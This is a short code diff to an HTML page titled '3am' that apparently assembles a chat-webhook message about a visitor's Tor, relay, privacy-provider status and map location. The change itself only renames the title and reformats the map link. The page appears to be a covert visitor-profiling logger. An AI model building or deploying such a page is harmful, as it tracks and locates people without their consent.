@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>3am</title>
+    <title>3am v2</title>
 </head>
 <body>
     <script>
@@ -50,7 +50,7 @@
                                 "`Tor:          " + (info.privacy?.tor ? "True" : "False") + "`\n" + 
                                 "`Relay:        " + (info.privacy?.relay ? "True" : "False") + "`\n" + 
                                 "`Provider:     " + (info.privacy?.service || 'N/A') + "`\n\n" + 
-                                "`Map:` " + ${mapUrl},
+                                "`**Map:** [View on OpenStreetMap](${mapUrl})`",
                             inline: false
                         }
                     ],
